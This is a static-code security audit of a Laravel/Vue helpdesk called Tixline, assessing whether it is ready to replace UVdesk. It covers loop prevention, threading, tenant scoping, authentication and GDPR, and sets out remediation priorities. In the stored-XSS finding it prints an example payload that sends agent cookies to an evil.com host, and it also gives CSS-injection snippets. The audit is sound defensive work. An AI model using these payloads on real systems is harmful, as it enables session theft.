# Tixline Production-Readiness Audit

**Date:** 2026-08-05
**Scope:** Assess readiness to replace UVdesk for support@digital4business.eu
**Method:** Static code review of all source files — no changes made

---

## Summary Table

| # | Item | Verdict | Severity |
|---|------|---------|----------|
| 1 | Auto-reply / loop prevention | PARTIAL | High |
| 2 | Threading | PARTIAL | High |
| 3 | Attachments | PRESENT | Low |
| 4 | Encoding / malformed mail | PARTIAL | Medium |
| 5 | IMAP polling code | ABSENT (by design) | N/A |
| 6 | Webhook authentication | PRESENT | Low |
| 7 | Credentials / secrets | PARTIAL | Medium |
| 8 | Spam filtering | PRESENT (with caveats) | Medium |
| 9 | Database (SQLite default) | PARTIAL | Medium |
| 10 | Seeders / insecure defaults | PARTIAL | Medium |
| 11 | Custom CSS injection | PARTIAL | Medium |
| 12 | Tenant resolution | PRESENT | Low |
| 13 | Tenant scoping | PARTIAL | High (multi-tenant) / Low (single-tenant) |
| 14 | Authentication | PARTIAL | Medium |
| 15 | Authorisation / IDOR | PARTIAL | Medium |
| 16 | Public endpoints / stored XSS | PARTIAL | Critical |
| 17 | GDPR | ABSENT | High |
| 18 | UVdesk migration | N/A (assessment) | — |
| 19 | Ingest-only mode | PRESENT | Low |
| 20 | Test coverage | PARTIAL | Medium |

---

## Detailed Findings

### 1. Auto-Reply and Loop Prevention — PARTIAL — Severity: High

**Inbound detection: PRESENT.** The `SpamFilter` checks all relevant headers before a ticket is created.

`app/Services/SpamFilter.php:43-64` — `checkAutoSubmitted()`:
```php
$autoSubmitted = strtolower($headers['auto-submitted'] ?? '');
if ($autoSubmitted && $autoSubmitted !== 'no') {
    return 'auto_submitted';
}
$precedence = strtolower($headers['precedence'] ?? '');
if (in_array($precedence, ['bulk', 'junk', 'list'])) {
    return 'auto_submitted';
}
if (! empty($headers['x-auto-response-suppress'])) {
    return 'auto_submitted';
}
```

`app/Services/SpamFilter.php:66-94` — `checkBounceOrNdr()`:
```php
$returnPath = $headers['return-path'] ?? '';
if ($returnPath === '<>' || $returnPath === '') {
    $from = strtolower($fromEmail);
    if (str_contains($from, 'mailer-daemon') || str_contains($from, 'postmaster')) {
        return 'bounce';
    }
}
```

Also catches `multipart/report` content type and `noreply@`/`no-reply@`/`postmaster@`/`mailer-daemon@` senders.

**Per-sender rate limit: PRESENT.** `SpamFilter.php:153-169` — 10 emails/hour per sender (configurable), cache-based, tenant-scoped.

**Outbound suppression headers: ABSENT.** `app/Mail/TicketReply.php:23-57` sets only `from` and `subject`. No `Auto-Submitted`, `X-Auto-Response-Suppress`, or `Precedence` headers on any outbound mail. The workflow action `mailRequester` (`app/Services/WorkflowEngine.php:205-213`) also sends raw mail without suppression headers:
```php
Mail::raw($template, function ($message) use ($ticket) {
    $message->to($ticket->requester_email)
        ->subject("[{$ticket->reference}] {$ticket->subject}");
});
```

**Out-of-office loop scenario:** A standard RFC 3834 out-of-office responder (which sets `Auto-Submitted: auto-replied`) would be caught by `checkAutoSubmitted()`. However, a non-compliant auto-responder that sends replies without standard headers would bypass detection. The per-sender rate limit (10/hour) provides a circuit breaker, but this could still generate up to 10 spurious tickets before kicking in. Additionally, since outbound mail lacks suppression headers, the responder's MTA has no signal to break the loop on its side.

---

### 2. Threading — PARTIAL — Severity: High

**Reply matching: subject-line based only.** `app/Services/InboundEmailProcessor.php:77-95`:
```php
protected function findExistingTicket(string $fromEmail, string $subject): ?Ticket
{
    if (preg_match('/\[TKT-(\d+)\]/', $subject, $matches)) {
        $ticket = Ticket::where('reference', 'TKT-'.$matches[1])
            ->whereIn('status', ['open', 'pending', 'resolved'])
            ->first();
        if ($ticket) {
            return $ticket;
        }
    }
    $cleanSubject = preg_replace('/^(Re|Fwd|Fw):\s*/i', '', $subject);
    return Ticket::where('requester_email', $fromEmail)
        ->where('subject', $cleanSubject)
        ->whereIn('status', ['open', 'pending'])
        ->first();
}
```

- `In-Reply-To` / `References` headers are **not used** for thread matching.
- Subject fallback matches on `requester_email` + cleaned subject, which could mismerge unrelated emails from the same sender with similar subjects.
- Two unrelated senders with subject "Re: Query" would create separate tickets (different `requester_email`). Same sender, same subject → merged.

**Message-ID storage:** `inbound_emails.message_id` is stored and has a unique index (`database/migrations/2026_08_04_104146_create_inbound_emails_table.php:16`), but is only used for idempotency (duplicate webhook detection), not for threading.

**Outbound headers: ABSENT.** `app/Mail/TicketReply.php:35-37` — `build()` calls `$this->html()` only. No `Message-ID`, `In-Reply-To`, or `References` headers are set via `withSymfonyMessage()`. Replies to customers will not thread in their mail clients.

---

### 3. Attachments — PRESENT — Severity: Low

`app/Services/AttachmentService.php`:

- **MIME type allowlist** (`config/support.php:14-24`): images, PDF, office docs, text, CSV, ZIP, `message/rfc822`.
- **Size limit** (`config/support.php:13`): default 10 MB per file, configurable via `ATTACHMENT_MAX_SIZE`.
- **Filename sanitisation** (`:79-89`): `basename()` strips path traversal, regex removes null bytes/control chars, dangerous extensions (`.php`, `.exe`, etc.) replaced with `.blocked`.
- **Storage** (`:54-59`): `Storage::disk('local')` → `storage/app/private/` — outside public webroot. Webhook files get 40-char random name + safe extension from MIME map.
- **Upload validation** (`CommentController.php:18-19`): `'attachments' => 'nullable|array|max:5'`, `'attachments.*' => 'file|max:10240'`.

**40 MB attachment:** Silently skipped — `storeFromWebhook()` returns `null` when size exceeds limit (`:49-52`). Email is still processed, attachment dropped. No log warning.

**Webhook attachment count limit: ABSENT.** `InboundEmailProcessor.php:70-75` loops through all attachments without a count check. An email with hundreds of small attachments would attempt to store all of them.

**Inline `cid:` parts:** Not handled. The `extractBody()` in `InboundMessage.php:85-113` extracts text/html parts but does not parse `cid:` references or extract inline image MIME parts as attachments.

---

### 4. Encoding and Malformed Mail — PARTIAL — Severity: Medium

`app/DTOs/InboundMessage.php:32-67` (`fromRawEmail`):

- **Subject decoding** (`:51`): `mb_decode_mimeheader()` handles RFC 2047 encoded-words. ✓
- **Multipart parsing** (`:85-106`): Basic MIME boundary splitting extracts `text/plain` and `text/html` parts. Prefers HTML body. Does NOT extract attachments from multipart MIME. ✓ Partial
- **Charset conversion: ABSENT.** No `mb_convert_encoding()` call. Body is taken as-is from the raw email. Non-UTF-8 content (e.g., `charset=iso-8859-1`) will be stored as mojibake in a UTF-8 database.
- **Transfer encoding: ABSENT.** No handling of `Content-Transfer-Encoding: base64` or `quoted-printable` on body parts within the pipe/raw path. The `extractBody()` method reads raw body text without decoding.
- **Webhook path:** Delegates parsing to the email provider, which handles encoding. ✓

**Failed message handling** (`app/Jobs/ProcessInboundEmailJob.php:18-55`):
```php
public int $tries = 3;
public array $backoff = [30, 120, 300];
```
- Retries 3 times with increasing backoff (30s, 2min, 5min).
- `failed()` method (`:45-55`) catches throwable, records status as `failed` with error message.
- Message is not lost — persisted in `inbound_emails` table as JSON payload.

---

### 5. IMAP Polling — ABSENT (by design) — N/A

No `php-imap` in `composer.json`. No IMAP code anywhere. The architecture uses:

1. **Webhook:** `POST /inbound/email` (for SendGrid, Mailgun, Postmark, etc.)
2. **Pipe:** artisan `support:process-email` reading from stdin (for Postfix/Exim pipe transport) — `app/Console/Commands/ProcessInboundEmail.php:12-26`.

No scheduled email polling in the scheduler.

---

### 6. Webhook Authentication — PRESENT — Severity: Low

`app/Http/Controllers/InboundEmailController.php:58-75`:
```php
protected function verifySignature(Request $request): bool
{
    $secret = config('support.inbound.webhook_secret');
    if (empty($secret)) {
        return false;   // Fails CLOSED — rejects when no secret configured
    }
    $signature = $request->header('X-Webhook-Signature');
    if (empty($signature)) {
        return false;
    }
    $expected = hash_hmac('sha256', $request->getContent(), $secret);
    return hash_equals($expected, $signature);
}
```

- **HMAC-SHA256** with request body content. ✓
- **Constant-time comparison** via `hash_equals()`. ✓
- **Fails closed** when no secret configured (returns false → 401). ✓
- **CSRF exempted** (`routes/web.php:42`): `->withoutMiddleware([VerifyCsrfToken::class])`. ✓
- **Rate limited** (`routes/web.php:41`): `->middleware('throttle:120,1')` — 120 req/min. ✓
- **Timestamp validation** (`:19-23`): Rejects replays older than 5 minutes. ✓
- **Idempotency** (`:31-50`): Checks `message_id` uniqueness before insert, catches `UNIQUE constraint`/`Duplicate entry` race conditions. ✓

This is well-implemented. The only minor note is that it uses a generic `X-Webhook-Signature` header rather than provider-specific HMAC (e.g., Mailgun's signature scheme), so the sending service must be configured to use this format.

---

### 7. Credentials — PARTIAL — Severity: Medium

`.env.example`:
```
APP_DEBUG=true          # Should be false in production
APP_ENV=local           # Should be production
MAIL_MAILER=log         # Safe default (no outbound)
INBOUND_WEBHOOK_SECRET= # Must be set — webhook rejects without it
MAIL_PASSWORD=null      # Standard env-based secret
```

- `APP_DEBUG=true` is the default — exposes stack traces, env vars, query details if not overridden. Standard Laravel pattern but must be set to `false` for production.
- `INBOUND_WEBHOOK_SECRET=` is empty, but the webhook **fails closed** (rejects all requests when empty) — safe default.
- `MAIL_MAILER=log` is a safe default — no outbound mail until explicitly configured.
- All secrets stored via `env()` in config files — no hardcoded credentials. No secrets-store integration.

---

### 8. Spam Filtering — PRESENT (with caveats) — Severity: Medium

`app/Services/SpamFilter.php` applies checks in order: auto-submitted → bounce/NDR → blocklist → allowlist → SpamAssassin headers → per-sender rate limit.

**Missing SpamAssassin headers:** If upstream doesn't stamp `X-Spam-Status`, `X-Spam-Score`, or `X-Spam-Flag`, those checks return false — **fails open silently**. No logging that headers are absent. Only the rate limit (10/hour) and blocklist remain as defenses for a clean-looking spam email.

**Blocklist/allowlist matching** (`SpamFilter.php:96-131`): Uses **exact match** on email address or domain (`$entry === $email || $entry === $domain`). No substring matching — this is correct behavior.

**Rejected messages:** Recorded in `inbound_emails` with `status='rejected'` and reason in `result` column. Full webhook payload preserved in `payload` JSON column. **No admin UI to review or recover false positives** — requires database access.

**Log-only mode** (`config/support.php:74`): `SPAM_LOG_ONLY=true` logs rejections but allows all emails through — useful for tuning. In normal mode, rejections are **not logged** (only stored in DB).

---

### 9. Database (SQLite Default) — PARTIAL — Severity: Medium

`config/database.php`: Default is SQLite.

**Tickets migration** (`database/migrations/2026_08_04_080414_create_tickets_table.php:14-34`):
```php
$table->enum('status', ['open', 'pending', 'resolved', 'closed'])->default('open');
$table->enum('priority', ['low', 'normal', 'high', 'urgent'])->default('normal');
$table->enum('source', ['email', 'web', 'api'])->default('web');
// ...
$table->index(['status', 'priority']);
$table->index('requester_email');
```

- **`enum` columns** (`:20-22`): SQLite treats `enum` as `varchar` — works but loses DB-level constraint enforcement. MySQL/Postgres enforce enum values natively.
- **Indexes present** for `['status', 'priority']` composite and `requester_email`. ✓
- **Missing index on `tenant_id`:** Added via `2026_08_04_084037_create_tenants_table.php:46` as `$table->foreignId('tenant_id')...constrained()`. MySQL auto-creates FK index; **PostgreSQL does not** — would need explicit index.
- Foreign keys present on all relationship columns. ✓
- `message_id` on `inbound_emails` is unique-indexed. ✓
- `reference` on `tickets` is unique-indexed. ✓

**SQLite → MySQL/Postgres migration:** No SQLite-only syntax found. Standard Laravel schema builder throughout. Migration path is straightforward.

---

### 10. Seeders — PARTIAL — Severity: Medium

`database/seeders/DatabaseSeeder.php:17-21`:
```php
if (app()->isProduction()) {
    $this->command->error('Seeder cannot run in production.');
    return;
}
```

**Production guard is present.** ✓

`User::factory()->create()` uses the factory default password `Hash::make('password')` (`database/factories/UserFactory.php:31`). Creates accounts with emails like `admin@example.com`, `sarah@example.com`, etc. These are only for development seeding and are blocked in production.

`.env.example` defaults:
- `APP_DEBUG=true` — must be overridden for production.
- `APP_ENV=local` — must be overridden for production.
- `MAIL_MAILER=log` — safe default.

---

### 11. Custom CSS Injection — PARTIAL — Severity: Medium

`resources/js/Components/ThemeProvider.vue:21-22`:
```vue
<component :is="'style'" v-if="cssVars">{{ cssVars }}</component>
<component :is="'style'" v-if="customCss">{{ customCss }}</component>
```

Uses Vue's `{{ }}` text interpolation, which sets `textContent` — **NOT `v-html`**. This means:
- **No HTML/script injection possible** — `</style><script>` would be escaped as text entities.
- **CSS is rendered correctly** — `textContent` on a `<style>` element is interpreted as CSS by the browser.
- **CSS-based data exfiltration IS possible** via attribute selectors (e.g., `input[value^="a"] { background: url('...') }`).

**Color fields** are concatenated unsanitized in `app/Models/Tenant.php:36-46`:
```php
public function cssVariables(): string
{
    return implode('; ', array_filter([
        "--color-primary: {$this->primary_color}",
        // ...
    ]));
}
```

`TenantController.php:40,69`: Color fields validated as `'nullable|string|max:7'` — NOT validated as hex colors. A malicious value like `red;} * { display:none` could inject arbitrary CSS via the CSS variables. However, since this is admin-only functionality, exploitation requires an already-compromised admin account.

**Logo/favicon URLs** (`:39,67`): Validated as `'nullable|string|max:500'` — **not validated as URLs**. A `javascript:` URI in `favicon_url` would be rendered as `<link rel="icon" :href="faviconUrl">`, which does NOT execute JavaScript. Low risk.

---

### 12. Tenant Resolution — PRESENT — Severity: Low

`app/Http/Middleware/ResolveTenant.php:43-74`:
```php
protected function resolveTenant(Request $request): ?Tenant
{
    $host = $request->getHost();

    // Try custom domain first
    $tenant = Tenant::where('domain', $host)->where('is_active', true)->first();
    if ($tenant) return $tenant;

    // Try subdomain
    $baseDomain = config('support.base_domain');
    if ($baseDomain && str_ends_with($host, ".{$baseDomain}")) {
        $slug = str_replace(".{$baseDomain}", '', $host);
        return Tenant::where('slug', $slug)->where('is_active', true)->first();
    }

    // Try from authenticated user's tenant
    if ($request->user() && $request->user()->tenant_id) {
        return Tenant::where('id', $request->user()->tenant_id)->where('is_active', true)->first();
    }

    return null;
}
```

- Uses `$request->getHost()` — trusts `X-Forwarded-Host` only when trusted proxies are configured (Symfony/Laravel behavior). ✓
- **No fallback to `Tenant::first()`** — returns `null` if no match. ✓
- Falls back to authenticated user's tenant — safe behavior.
- **Host header poisoning:** Standard Laravel concern. If trusted proxies are not configured and the app is behind a reverse proxy, `Host` could be spoofed. Password reset emails use `APP_URL`, not the `Host` header, so poisoned links are not a concern if `APP_URL` is set correctly.

---

### 13. Tenant Scoping — PARTIAL — Severity: High (multi-tenant) / Low (single-tenant)

`app/Models/Scopes/TenantScope.php:11-18`:
```php
public function apply(Builder $builder, Model $model): void
{
    $tenant = app()->bound('tenant') ? app('tenant') : null;
    if ($tenant) {
        $builder->where($model->getTable().'.tenant_id', $tenant->id);
    }
}
```

`app/Models/Concerns/BelongsToTenant.php:11-23`: Registers global scope and auto-fills `tenant_id` on creation.

**Only ONE model uses `BelongsToTenant`: Ticket.** Verified by grepping for `BelongsToTenant` across `app/Models/` — only `Ticket.php:14` has `use BelongsToTenant;`.

**Only TWO tables have `tenant_id` columns:** `users` and `tickets` (added in `database/migrations/2026_08_04_084037_create_tenants_table.php:41-47`). No other table has a `tenant_id` column.

**Models WITHOUT any tenant scoping (shared globally):**
- **User** — has `tenant_id` column but does NOT use `BelongsToTenant`. `TicketController.php:52` calls `User::all(['id', 'name'])` which returns agents from ALL tenants.
- **Label** — no `tenant_id`, no scoping. `LabelController::index()` returns all labels globally.
- **Team** — no `tenant_id`, no scoping. Shared across tenants.
- **Workflow** — no `tenant_id`, no scoping. `WorkflowController::index()` returns all workflows. `WorkflowEngine::run()` executes all active workflows regardless of tenant.
- **CannedResponse** — no `tenant_id`. `TicketController::show()` returns shared responses from all tenants.
- **Form**, **SlaPolicy**, **KbCategory**, **KbArticle**, **Department** — all global, no tenant scoping.
- **Comment**, **Attachment** — accessed through Ticket relationship (indirectly scoped).
- **InboundEmail** — no `tenant_id`. Payload stored globally.

**Cross-tenant exposure in controllers:**

`app/Http/Controllers/TicketController.php:51-52`:
```php
'agents' => User::all(['id', 'name']),
```
Returns all users from all tenants in the agent assignment dropdown.

`app/Http/Controllers/WorkflowController.php:14-21` — returns all workflows across tenants.

**`WorkflowEngine.php:176`** uses `Ticket::withoutGlobalScopes()` for round-robin — picks last-assigned agent across all tenants.

**For single-tenant deployment (this use case):** Not a functional concern — there's only one tenant. The data is correct even without scoping. **For multi-tenant deployment:** This would be a critical cross-tenant data leak requiring `tenant_id` columns and `BelongsToTenant` on every shared model.

---

### 14. Authentication — PARTIAL — Severity: Medium

- **Separate guards** (`config/auth.php:41-49`): `web` (agents/admins), `customer` (portal). Customer guard cannot reach agent routes (separate middleware groups in `routes/web.php`). ✓
- **Login rate limiting** — agent: Laravel Breeze default (5 attempts). Customer portal: `throttle:5,1` middleware on `routes/web.php:130-132`. ✓
- **Password policy:** Laravel default only (min 8 chars). No complexity requirements.
- **Session config** (`config/session.php`): `SESSION_ENCRYPT=false`, `SESSION_SECURE_COOKIE=null` by default, `http_only=true`, `same_site=lax`, `serialization=json`. ✓ Safe defaults for dev; production needs `SESSION_SECURE_COOKIE=true`.
- **Sanctum tokens** (`config/sanctum.php:53`): `'expiration' => null` — tokens never expire. No scoping configured.

---

### 15. Authorisation / IDOR — PARTIAL — Severity: Medium

**Agent side:** `app/Policies/TicketPolicy.php` — role-based access with granular checks (admin sees all, team lead sees team, agent sees assigned). `TicketController::show()` calls `$this->authorize('view', $ticket)` at line 57. ✓

**Customer portal IDOR prevention:** `app/Http/Controllers/CustomerPortalController.php:84-89`:
```php
public function showTicket(int $ticket)
{
    $customer = Auth::guard('customer')->user();
    $ticket = Ticket::where('requester_email', $customer->email)
        ->findOrFail($ticket);
```
Scopes query to customer's email — cannot view other customers' tickets. ✓

`replyToTicket()` (`:101-105`) also scopes to customer's email. ✓ Tested at `tests/Feature/CustomerPortalTest.php:120-133` and `tests/Feature/TenantIsolationTest.php:83-107`.

**API:** `app/Http/Controllers/Api/TicketApiController.php:12-29`:
- `index()` — no policy check. Any authenticated API user lists all tickets in tenant. Acceptable for agent tokens; problematic if customer tokens were issued.
- `show()`, `update()`, `addComment()` — no policy checks either. Route model binding resolves any ticket in tenant.
- **All API routes are behind `auth:sanctum`** and tenant scoping applies. No public API access.

---

### 16. Public Endpoints / Stored XSS — PARTIAL — Severity: Critical

**`/submit` (POST):** Rate limited via `throttle:10,1` (`routes/web.php:36`). ✓ Input validated. No CAPTCHA or honeypot — automated form spam would create real tickets up to rate limit.

**Stored XSS: PRESENT.** `resources/js/Pages/Tickets/Show.vue:115`:
```vue
<div class="p-6 prose prose-sm max-w-none" v-html="ticket.body || '<em>No description</em>'" />
```

Line 141:
```vue
<div class="p-6 prose prose-sm max-w-none" v-html="comment.body" />
```

Both use `v-html` which renders raw HTML without escaping. Ticket body comes from:
- **Inbound email** (`InboundEmailProcessor.php:51-57`): Body is stored as-is from `InboundMessage`. For the pipe path, `extractBody()` returns raw HTML for `text/html` content type. For the webhook path, body comes directly from the provider payload.
- **Public submission** (`PublicTicketController.php:42-43`): `'body'` stored from form input — any HTML would be stored.
- **Agent/API creation** (`TicketController.php:105`, `TicketApiController.php:61`): Same — stored without sanitization.

**Impact:** A hostile email containing `<img src=x onerror="document.location='https://evil.com/?c='+document.cookie">` in its HTML body would execute in the browser of any agent viewing the ticket. This is a **critical stored XSS vulnerability** that could steal agent session cookies.

**Customer portal:** `resources/js/Pages/Portal/TicketDetail.vue` — need to verify rendering, but given the pattern, likely also uses `v-html`.

---

### 17. GDPR — ABSENT — Severity: High

- No data export / subject-access-request endpoint or command.
- No right-to-be-forgotten / data deletion capability.
- No data retention policy or automated purging.
- No consent management or privacy policy page.

**Personal data stored:** Customer name/email (customers table), ticket content including email bodies (tickets table), sender info in inbound email headers (inbound_emails.payload JSON), comments (comments table), attachment files on disk.

**Logging:** `LOG_LEVEL=debug` by default (`.env.example:21`). SpamFilter logs sender email and subject when rejecting in log-only mode (`SpamFilter.php:27-31`). InboundEmailProcessor does not log email bodies.

---

### 18. UVdesk Migration Assessment — N/A

| UVdesk Table | Tixline Table | Mapping Notes |
|---|---|---|
| `uv_ticket` | `tickets` | Subject, status, priority map. UVdesk `source`, `mailbox_email`, `is_trashed`, `is_starred` have no equivalent |
| `uv_thread` | `comments` | UVdesk `thread_type` (reply/note/forward), `cc`, `bcc` — Tixline has `type` (reply/note) and `is_internal`, no cc/bcc |
| `uv_user` (customers) | `customers` | Basic name/email maps |
| `uv_user` (agents) | `users` | Role mapping: ROLE_AGENT→agent, ROLE_ADMIN→admin |
| `uv_ticket_attachment` | `attachments` | File paths need remapping; polymorphic in Tixline |
| `uv_ticket_label` | `label_ticket` | Direct pivot mapping |
| `uv_saved_replies` | `canned_responses` | Direct mapping |
| UVdesk groups | `teams`/`departments` | Structural mismatch |
| `uv_email_templates` | — | No equivalent in Tixline |

**Effort:** Medium. Core ticket/thread/customer data maps well. Attachment files need physical migration. Missing fields (`cc`, `bcc`, thread types, `is_starred`) require schema additions or data loss acceptance.

---

### 19. Ingest-Only Mode — PRESENT — Severity: Low

**Outbound mail paths identified:**

1. **Agent reply** → `CommentController::store()` (`:39`) → `Mail::to($ticket->requester_email)->send(new TicketReply(...))`
2. **Workflow `mail_requester`** → `WorkflowEngine::mailRequester()` (`:205-213`) → `Mail::raw()`
3. **Workflow `mail_agent`** → `WorkflowEngine::mailAgent()` (`:188-203`) → `Mail::raw()`
4. **Password reset / email verification** — Laravel default Breeze

**Single-flag disable:** `.env.example` already defaults to `MAIL_MAILER=log`. Setting this in production routes all outbound mail to `storage/logs/laravel.log`. This is a complete, tested Laravel mechanism that disables all outbound mail with a single env change. ✓

---

### 20. Test Coverage — PARTIAL — Severity: Medium

**26 test files covering:**

| Test File | Covers |
|---|---|
| `InboundEmailWebhookTest.php` (227 lines) | HMAC verification, timestamp validation, idempotency, duplicate handling, ticket creation, threading, spam rejection |
| `SpamFilterTest.php` (201 lines) | Auto-submitted detection, bounce/NDR, blocklist/allowlist, SpamAssassin headers, rate limiting, log-only mode |
| `CustomerPortalTest.php` (179 lines) | Login/register, own-ticket visibility, IDOR prevention, reply, ticket reopening |
| `TenantIsolationTest.php` (121 lines) | Cross-tenant ticket visibility, API scoping, customer cross-ticket prevention |
| `ApiTest.php` (106 lines) | Auth requirement, CRUD, filtering, validation |
| `PublicSubmitTest.php` (67 lines) | Form rendering, ticket creation, custom fields, validation |
| `TicketControllerTest.php` | Agent ticket CRUD |
| `PermissionTest.php` | Role-based access control |
| `SlaWorkflowTest.php` | SLA + workflow integration |
| `TeamLabelWorkflowTest.php` | Team/label workflow actions |
| `CommentControllerTest.php` | Comment creation |
| `AttachmentServiceTest.php` (unit) | Attachment processing |
| `InboundEmailProcessorTest.php` (unit) | Processing logic |
| `WorkflowEngineTest.php` (unit) | Condition evaluation, action execution |
| `AutomationEngineTest.php` (unit) | Time-based automations |
| Auth tests (6 files) | Login, registration, password reset, email verification |

**Not covered by any test:**
- Stored XSS via `v-html` rendering of ticket body / comments
- Encoding edge cases (non-UTF-8 charset, quoted-printable on pipe path)
- Custom CSS injection / CSS data exfiltration
- Sanctum token expiry behavior
- Host header poisoning
- Outbound mail suppression headers
- Webhook attachment count limits
- GDPR data export/deletion
- `WorkflowEngine.withoutGlobalScopes()` cross-tenant leakage

---

## Prioritised Remediation

### Must Fix Before Touching Real Mail (Blockers)

1. **Sanitize HTML in ticket body before rendering** — The `v-html="ticket.body"` and `v-html="comment.body"` in `Show.vue:115,141` is a **critical stored XSS** vulnerability. Either sanitize HTML server-side before storage (e.g., with `HTMLPurifier` or `mews/purifier`), or use a Vue-side sanitizer like DOMPurify before `v-html`. Every code path that stores body content needs this. — **Critical**

2. **Add outbound mail suppression headers** — Set `Auto-Submitted: auto-generated` and `X-Auto-Response-Suppress: All` on all outbound mail (`TicketReply.php`, `WorkflowEngine::mailRequester`, `WorkflowEngine::mailAgent`). Without this, an auto-reply loop can generate up to 10 tickets/hour per sender. — **High**

3. **Add `In-Reply-To` / `References` / `Message-ID` to outbound mail** — Without these, replies from agents won't thread in customer mail clients, and inbound replies may not match back to existing tickets if the subject is modified. — **High**

4. **Set production `.env`** — `APP_DEBUG=false`, `APP_ENV=production`, `SESSION_SECURE_COOKIE=true`, `LOG_LEVEL=warning`. — **High**

### Should Fix Before GA

5. **Enforce attachment count limit on webhook path** — Add a max-count check in `InboundEmailProcessor::processAttachments()`. — **Medium**

6. **Handle charset and transfer encoding on pipe path** — Add `quoted_printable_decode()` / `base64_decode()` and `mb_convert_encoding()` in `InboundMessage::extractBody()`. — **Medium**

7. **Add `In-Reply-To` / `References` header-based threading** — Use stored `message_id` from `inbound_emails` for thread matching instead of relying solely on subject line. — **Medium**

8. **Set Sanctum token expiration** — Configure `'expiration' => 43200` (30 days) in `config/sanctum.php`. — **Medium**

9. **Validate color fields as hex** — Add regex `^#[0-9a-fA-F]{6}$` for all `*_color` fields in `TenantController`. — **Low**

10. **Add CAPTCHA to `/submit`** — Turnstile, hCaptcha, or honeypot to prevent automated form spam. — **Low**

### Should Fix Before EU Production (Compliance)

11. **GDPR: data export and deletion** — Implement subject access request endpoint and right-to-be-forgotten command. — **High**

12. **GDPR: data retention** — Add configurable retention periods and automated purging. — **Medium**

13. **GDPR: logging hygiene** — Ensure `LOG_LEVEL` is `warning` or higher in production. Review personal data in log messages. — **Medium**

### Can Follow Later

14. **Build spam quarantine UI** — Let agents review and recover false positives. — **Low**
15. **Log spam scores for all messages** — Helps diagnose when SpamAssassin headers are missing. — **Low**
16. **Add PostgreSQL-specific tenant_id indexes** — If deploying on Postgres. — **Low**
17. **Handle inline `cid:` parts** — Rewrite CID references to stored attachment URLs. — **Low**

---

## Go / No-Go: Parallel Ingest-Only Trial

**Verdict: CONDITIONAL GO** — with these prerequisites (estimated effort: 2-4 hours):

1. **Fix stored XSS** (item 1) — A hostile email can steal agent cookies. Even in ingest-only mode, agents will view tickets in the Tixline UI. This must be fixed before any real email touches the system.

2. **Set `MAIL_MAILER=log`** in `.env` — already the default in `.env.example`, just confirm in production.

3. **Set `APP_DEBUG=false`**, `APP_ENV=production`, `SESSION_SECURE_COOKIE=true`.

4. **Confirm `INBOUND_WEBHOOK_SECRET` is set** — webhook already fails closed without it, so this is operationally required anyway.

With those changes, the system can safely ingest real mail from support@digital4business.eu alongside UVdesk without sending replies, creating loops, or exposing agent sessions. The spam filter and auto-reply detection are solid for a low-volume inbox. The per-sender rate limit (10/hour) provides an adequate circuit breaker.

**Do NOT run `db:seed` in the production environment** (it's guarded, but don't test it).

The remaining items (GDPR, threading headers, charset handling, CSS sanitization) are real issues but do not block a monitored, ingest-only trial where agents continue using UVdesk for all replies.
